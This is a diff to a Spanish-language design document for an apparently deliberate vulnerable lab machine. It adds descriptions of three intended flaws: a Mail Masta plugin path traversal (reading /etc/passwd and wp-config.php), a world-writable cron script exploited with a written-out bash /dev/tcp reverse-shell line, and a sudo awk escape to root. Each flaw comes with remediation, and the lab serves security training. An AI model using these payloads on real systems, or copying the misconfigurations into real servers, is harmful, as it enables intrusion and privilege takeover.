@@ -86,6 +86,48 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 ## 7. Vulnerabilidades implementadas
 
+### 7.1. Vulnerabilidad de Acceso Inicial: Plugin Vulnerable (Mail Masta - LFI)
+Justificación
+- Activo afectado: ((WB-1)) Blog (WordPress) / ((MD-2)) lighttpd (Puerto 7664).
+
+- Configuración la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).
+
+- Riesgo representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).
+
+- Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.
+
+- Impacto tiene: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.
+
+- Cómo se corregiría en un sistema real: Desinstalar de inmediato el plugin Mail Masta o actualizarlo a una versión parcheada que sanitice las entradas del usuario. Implementar directivas estrictas en la configuración de PHP (allow_url_fopen = Off y allow_url_include = Off).
+
+### 7.2. Escalada de Privilegios (Movimiento Lateral): Tarea Cron Modificable
+Justificación
+- Activo afectado: ((AC-1)) Usuarios y Archivos / Script de mantenimiento /opt/scripts/backup_notes.sh.
+
+- Configuración la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.
+
+- Riesgo representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.
+
+- Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.
+
+- Impacto tiene: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.
+
+- Cómo se corregiría en un sistema real: Aplicar el principio de mínimo privilegio sobre el archivo de mantenimiento, eliminando el permiso de escritura para el resto de usuarios del sistema mediante el comando chmod 755 /opt/scripts/backup_notes.sh o asignando la propiedad estricta a su ejecutor legítimo.
+
+### 7.3. Escalada de Privilegios (Máxima): Configuración Insegura de Sudo (awk)
+Justificación
+- Activo afectado: ((SO-1)) Ubuntu Server / Reglas de Sudoers.
+
+- Configuración la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).
+
+- Riesgo representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).
+
+- Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.
+
+- Impacto tiene: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.
+
+- Cómo se corregiría en un sistema real: Revocar la directiva NOPASSWD para comandos que dispongan de funciones de escape integradas. Si es estrictamente necesario delegar la tarea a awk, estructurar scripts específicos firmados o restringir sus argumentos mediante alias de comandos específicos en /etc/sudoers para evitar la inyección de la función system().
+
 ## 8. Write-up de resolución
 - [Write-up de resolución](ruta-explotacion.md)
   
